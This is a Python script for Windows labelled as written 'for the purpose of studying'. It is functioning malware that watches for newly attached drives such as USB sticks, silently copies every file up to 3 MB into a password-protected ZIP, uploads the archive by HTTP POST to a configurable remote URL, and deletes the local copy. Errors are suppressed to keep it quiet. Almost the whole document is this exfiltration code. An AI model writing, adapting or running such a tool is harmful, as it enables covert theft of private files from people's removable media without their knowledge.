
# The script was created for the purpose of studying

import win32api
import os
from time import sleep
import pyzipper
import datetime
from threading import Thread
import requests as r


sendUrl = ''  # ZIP file send url
capturedFileMaxSize = 3  # Maximum size of the captured file in megabytes


def zip_files(path):
    now = datetime.datetime.now()
    zip_name = f'{now.strftime("%d-%m-%Y_%H_%M")}.zip'

    with pyzipper.AESZipFile(zip_name, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(b'123')

        for root, dirs, files in os.walk(path):
            for i in range(len(files)):
                if os.path.getsize(f'{root}\\{files[i]}') <= capturedFileMaxSize * 1048576:
                    try:
                        zf.write(f'{root}\\{files[i]}')
                    except:
                        pass

    return zip_name


def send_files(filename):
    with open(filename, 'rb') as f:
        try:
            resp = r.post(sendUrl, files={'files': f})
            # SEND STATUS LOG
        except Exception as e:
            # SEND EXCEPTION LOG
            pass

    os.remove(filename)


def check_devices():
    while True:

        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]

        sleep(2)

        new_drives = win32api.GetLogicalDriveStrings()
        new_drives = new_drives.split('\000')[:-1]

        if drives == new_drives:
            continue

        else:

            disk_path = list(set(new_drives) - set(drives))
            if not disk_path:
                continue
            else:
                zip_file_name = zip_files(disk_path[0])
                if zip_file_name:
                    send_files(zip_file_name)


if __name__ == '__main__':
    t1 = Thread(target=check_devices)
    t1.start()
